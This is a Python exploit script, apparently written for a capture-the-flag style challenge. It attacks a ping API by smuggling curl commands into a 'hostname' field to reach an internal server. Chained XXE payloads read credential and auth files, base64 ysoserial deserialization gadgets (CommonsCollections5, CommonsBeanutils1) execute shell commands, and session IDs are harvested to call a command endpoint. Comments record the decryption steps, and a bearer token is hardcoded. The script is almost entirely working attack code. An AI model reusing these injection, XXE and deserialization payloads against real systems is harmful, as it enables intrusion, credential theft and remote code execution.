import requests


token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGlua3lmaXNoIiwibmFtZSI6InN0IW5reSIsImlhdCI6MTU1MTc4MzAwOH0.I97GwWb5eM7Qe0xQtDaKLCtrq4C5aXfHy9RFXuvz40c"
headers = {"Authorization": "Bearer "+token, "accept-encoding":"gzip, deflate, br", "accept-language":"en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5", "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36", "accept":"application/json, text/plain, */*", "referer":"https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/foobarcampaign-messages/cncChat.html", "authority":"k7vo268tif.execute-api.us-east-1.amazonaws.com","Content-Type":"application/json"}

#payload
#payload example: XXE get properties
payload_00 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}

payload_01 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<credentials><user>aaa</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_02 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_03 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_04 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_05 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/index.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_06 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\">]><credentials>&xxe;</credentials>\r\n------123--\r\n' -i -L"}
payload_07 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}



#guess
payload_08 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=test -F type=STOP -F target= -F argument="}
# 08 no use, try below
# payroll: CommonsCollections5
yso_payload1 = "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAVG9wZW5zc2wgZW5jIC1hZXMtMjU2LWVjYiAtaW4gL2V0Yy9jb21tYW5kYXV0aC5iaW4gLW91dCAvdG1wL2FhYS5lbmMgLWJhc2U2NCAtayAxMjM0NXQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="
# payroll: CommonsBeanutils1
yso_payload2 = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABurK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQBUb3BlbnNzbCBlbmMgLWFlcy0yNTYtZWNiIC1pbiAvZXRjL2NvbW1hbmRhdXRoLmJpbiAtb3V0IC90bXAvYWFhLmVuYyAtYmFzZTY0IC1rIDEyMzQ1CAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDYyNjAyMzU1MzE5OTQyAQAgTHlzb3NlcmlhbC9Qd25lcjQ2MjYwMjM1NTMxOTk0MjsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABIAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgAOeA=="
payload_09 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\n"+yso_payload2+"\r\n------123--\r\n' -L"}
payload_10 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"/tmp/aaa.enc\">]><credentials><user>&xxe;</user><password></password></credentials>\r\n------123--\r\n' -i -L"}
payload_11 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
payload_12 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
#payload_13 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}
#payload_135 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -F authCode=YYYYYYYYYY -F type=STOP -F target= -F argument= "}


#payload_14 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -i -L"}

payload_15 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}
#payload_16 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nYYYYYYYYYY\r\n------123--\r\n' -L"}

def rockman():
    print("========== payload 01 login ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_01, headers=headers)
    print(r.status_code)
    print(r.text)

    #print(r.text.find("JSESSIONID="))
    sessionid01 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid01)
    print("========== payload 02 ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_02, headers=headers)
    print(r.status_code)
    print(r.text)

    sessionid02 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid02)
    sessionid03 = r.text.split("JSESSIONID=")[2].split(";")[0]
    print(sessionid03)
    sessionid04 = r.text.split("JSESSIONID=")[3].split(";")[0]
    print(sessionid04)

    print("========== payload 03 ==========")
    print(payload_03)
    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 04 ==========")
    print(payload_04)
    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 05 ==========")
    print(payload_05)
    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 06 ==========")
    print(payload_06)
    payload_06["hostname"] = payload_06["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_06, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 07 ==========")
    print(payload_07)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_07, headers=headers)
    print(r.status_code)
    print(r.text)

    #print("========== payload 00 vs 07 === Testing =======")
    #print(payload_00)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_00, headers=headers)
    #print(r.status_code)
    #print(r.text)



    print("========== payload 08 ==========")
    print(payload_08)
    payload_08["hostname"] = payload_08["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_08, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 09 ==========")
    print(payload_09)
    payload_09["hostname"] = payload_09["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_09, headers=headers)
    print(r.status_code)
    print(r.text)

    #get etc/commandauth.bin content
    print("========== payload 10 ==========")
    print(payload_10)
    payload_10["hostname"] = payload_10["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_10, headers=headers)
    print(r.status_code)
    print(r.text)

    commandauth_content = r.text.split('<user>')[1].split('</user>')


    # get tmp/aaa.enc
    # yso_payload1_result: U2FsdGVkX1+SqVuAjTom+gRMrBy+M1xkX/BGMy+2wrMv8YA4cxp5fHoSuCKxT20B\nBqf3oRlRJbiOKPLTVgQhgwy3LqBZHm4hK1fxHeYnKErIIrQdL/2m1Se+MmmTK3y8\ntP6tWECvqghS53/iZxLOTVQRmbuxx0fTm/Lrp7X45xz9rmEuFLtcck+1+zU9AGoy\n1XLcarQplT5AL2pysXLkXmrwWa18JvnsKCLxVWDD71HgblxZ96gx+jd04sPuFMcM\n4f7fjZrBFyOa9HVpm0L3bFBSEIWtNQTnWEVH0xI4Q0sYjSHPJyFK2OqEyuBUoPEt\nw6Rvdc9Pw15ZktwDDZHH9cd3cu7OAx5Km2falexEJ+OfDtijONvNO4LVoUYwKg+r\n
    # yso_payload2_result: U2FsdGVkX19RmtY0OHYM8NLR8XQ3s7xqV/LUj6zfweUdq9Jp3KqPG5fng3P9+V/U\nFvTlrFGq9iQ+MUyBWq/mxN8lYqrXcjzcXjMDKlqxf9YrqQwLtVLtOhUPuBJNQXUF\ns5X1lp/ZghXczlrNI3QU8MYA4k5+zvj+i9+lT1THVrjsqWI1M6+w9jrFpQMFDasr\nJH8pr9Aj6DwDLqaTlAOTQF5cD/CbbLCBPgIkI+/NraVBqJHKKXjV6QPGbvyeFxkZ\nCJcb3RaIgX3F+WxxaTBIRWNzm/IR20izsJG+vXSNLyf+MSH0kEGN8sKZa2w7WiF8\n9jfGGPF83W8MfjibXwFh816J7ASTqZqUOJ83vn9xCrDY6lKE3G6jSQ/HpzTQ01nB\n
    # well-formated it into text file, especially next line should be replaced
    # run openssl decrypt: openssl aes-256-ecb -d -a -in aaa.enc -out auth.enc
    # openssl base64 -in auth.enc -out command.txt
    # add command to authcode parameter, remember next line format
    # rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w==
    # rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w==
    
    #print("========== payload 11 ==== Not correct format ======")
    #authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8\nOv5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/Yh\nKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe\n6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94\nF0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV\n1JZoKNni+goINz1b1E9o8w=="
    #print(payload_11)
    #payload_11["hostname"] = payload_11["hostname"].replace("ZZZZZZZZZZ", sessionid01)
